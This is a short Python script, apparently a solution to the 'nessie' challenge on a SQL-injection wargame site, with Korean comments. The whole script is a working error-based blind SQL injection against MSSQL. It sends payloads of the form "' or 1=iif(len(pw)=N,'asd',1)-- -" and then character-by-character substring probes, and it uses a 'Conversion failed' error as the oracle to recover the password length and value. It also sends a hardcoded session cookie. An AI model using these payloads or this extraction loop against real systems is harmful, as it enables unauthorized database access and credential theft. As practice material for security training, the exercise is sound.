import string
import requests

url = "https://los.rubiya.kr/chall/nessie_7c5b5d8119ce2951f2a4f2b3a1824dd2.php"
params = {'id' : None}
cookies = {"PHPSESSID" : "mckb6uj8ldfsho123g0u5jkokp"}

# 비밀번호 길이 구하기
pw_len = 0
i=1
for i in range(1,30):
    payload = "' or 1=iif(len(pw)={},'asd',1)-- -".format(i)
    params["id"] = payload
    print(payload)
    response = requests.get(url,params=params,cookies=cookies)
    if("Conversion failed" in response.text):
        print("find the pw_len",i)
        pw_len = i 



pw_len = 5
# 비밀번호 구하기
# 비밀번호 길이 5
flag = ''
for i in range(1,pw_len + 1):
    for j in string.printable:
        payload = "' or 1=iif(substring(pw,{},1)='{}','asd',1)-- -".format(i,j)
        params["id"] = payload
        print(payload)
        response = requests.get(url,params=params,cookies=cookies)
        if("Conversion failed" in response.text):
            flag += j
            print("find the pw",flag)
            break
